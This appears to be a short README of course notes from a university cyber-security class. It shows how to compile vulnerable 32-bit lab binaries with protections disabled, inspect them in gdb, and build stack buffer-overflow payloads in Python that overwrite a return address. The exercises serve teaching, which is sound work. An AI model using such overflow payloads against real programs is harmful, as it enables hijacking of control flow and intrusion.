# UNIMORE-cyber-security

```commandline
gcc -w -m32 -fno-stack-protector -fno-pic -no-pie -g -o
```

```commandline
python3 -c 'print("A"*number)' | ./esercizio1
```

# GDB
```commandline
$ gdb esercizio1
(gdb) disassamble main
```

# BE AWARE!!
```commandline
mov (or movb, movl, movw, movq)
lea
cmpl
```

# python2
```python
a = ""
for _ in range(10):
    a += "A"
print(a + '\x6b\x84\x04\x08')
```

# python3
```python
import sys

length = 10
payload = b"A" * length + b'\x6b\x84\x04\x08'
sys.stdout.buffer.write(payload)
```
